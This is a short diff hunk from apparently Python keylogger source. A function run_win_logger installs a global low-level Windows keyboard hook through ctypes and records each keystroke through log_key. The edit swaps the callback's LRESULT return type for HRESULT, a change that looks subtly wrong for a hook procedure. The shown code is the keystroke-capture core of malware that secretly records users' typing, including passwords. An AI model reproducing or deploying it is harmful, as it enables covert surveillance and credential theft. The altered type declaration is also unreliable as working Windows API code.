@@ -10,6 +10,6 @@ def run_win_logger():
             log_key(chr(kbd.contents.message))
         return user32.CallNextHookEx(None, nCode, wParam, lParam)
 
-    callback = ctypes.CFUNCTYPE(wintypes.LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)(hook_proc)
+    callback = ctypes.CFUNCTYPE(wintypes.HRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)(hook_proc)
     user32.SetWindowsHookExA(13, callback, None, 0)
     user32.GetMessageA(None, None, 0, 0)
